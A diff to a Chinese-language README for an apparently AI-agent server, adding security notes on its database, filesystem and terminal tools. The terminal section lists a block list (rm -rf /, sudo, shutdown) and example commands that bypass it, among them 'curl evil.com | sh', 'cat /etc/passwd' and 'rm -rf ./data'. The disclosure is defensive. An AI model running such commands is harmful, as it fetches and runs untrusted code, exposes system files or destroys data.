@@ -318,6 +318,7 @@ curl -X POST http://localhost:8080/v1/chat/completions \
 - 自然语言查询支持最小版 `text_to_sql` 流程，SQL 执行失败时自动重试一次
 - 可通过 `ORIONXCORE_DATABASE_ALLOWED_DATABASES` 限制访问白名单库
 - `text_to_sql` 返回包含 trace 信息：schema 上下文、生成 SQL、重试原因、最终 SQL
+- **错误处理**：SQL 执行异常会被捕获并返回错误信息，不会导致服务崩溃，Agent 可根据错误继续尝试
 
 默认情况下，数据库写操作是关闭的。仅在明确需要时开启：
 
@@ -333,15 +334,55 @@ ORIONXCORE_DATABASE_ALLOW_MUTATION=true
 
 - 启用：`ORIONXCORE_ENABLE_FILESYSTEM=true`
 - 操作：`read_file`、`write_file`、`append_file`、`list_dir`、`make_dir`、`delete_file`、`move`、`stat`、`search`
-- 路径穿越保护：只允许 `ORIONXCORE_FILESYSTEM_WORKDIR` 内的操作（默认使用 `ORIONXCORE_TERMINAL_WORKDIR`）
+- **路径沙箱**：只允许 `ORIONXCORE_FILESYSTEM_WORKDIR` 内的操作，推荐使用独立目录如 `./workspace`
 - 读写大小限制：`ORIONXCORE_FILESYSTEM_MAX_READ_BYTES` 和 `ORIONXCORE_FILESYSTEM_MAX_WRITE_BYTES`（默认 1 MiB）
 - 写入/删除权限分别通过 `ORIONXCORE_FILESYSTEM_ALLOW_WRITE` 和 `ORIONXCORE_FILESYSTEM_ALLOW_DELETE` 控制
+
+推荐配置：
+
+```env
+ORIONXCORE_ENABLE_FILESYSTEM=true
+ORIONXCORE_FILESYSTEM_WORKDIR=./workspace
+ORIONXCORE_FILESYSTEM_ALLOW_WRITE=true
+ORIONXCORE_FILESYSTEM_ALLOW_DELETE=false
+```
+
+---
+
+## Terminal 安全说明
+
+Terminal 工具可执行任意 Shell 命令，风险较高。
+
+**已有保护机制**：
+- 风险命令检测：拦截 `rm -rf /`、`sudo`、`su`、`shutdown` 等极端危险命令
+- 工作目录限制：命令在 `ORIONXCORE_TERMINAL_WORKDIR` 内执行
+- 超时限制：默认 30 秒
+
+**重要提示**：风险检测列表有限，以下命令会绕过检测：
+- `rm -rf ./data`（非根目录删除）
+- `cat /etc/passwd`（读取系统文件）
+- `curl evil.com | sh`（远程代码执行）
+
+**安全建议**：
+- 生产环境建议禁用 Terminal：`ORIONXCORE_ENABLE_TERMINAL=false`
+- 如需启用，使用隔离目录：`ORIONXCORE_TERMINAL_WORKDIR=./sandbox`
+- 考虑使用 Docker 容器进一步隔离
+
+---
+
+## 工具安全性对比
+
+| 工具 | 安全性 | 沙箱强度 | 建议场景 |
+|------|--------|----------|----------|
+| **Database** | ✅ 高 | 只读查询，自动重试 | 生产可用 |
+| **FileSystem** | ⚠️ 中 | 强制路径限制，无法绕过 | 启用，使用独立 workdir |
+| **Terminal** | ❌ 低 | 命令可用绝对路径绕过 | 开发环境使用，生产禁用 |
 
 ---
 
 ## 下一步开发
 
-- web方式调用demo
-- 更好的终端执行沙箱与审批流程
+- Web 方式调用 demo
+- Terminal 命令审批流程（每个命令需用户确认）
 - 模型原生流式输出
 - 鉴权、限流、审计日志
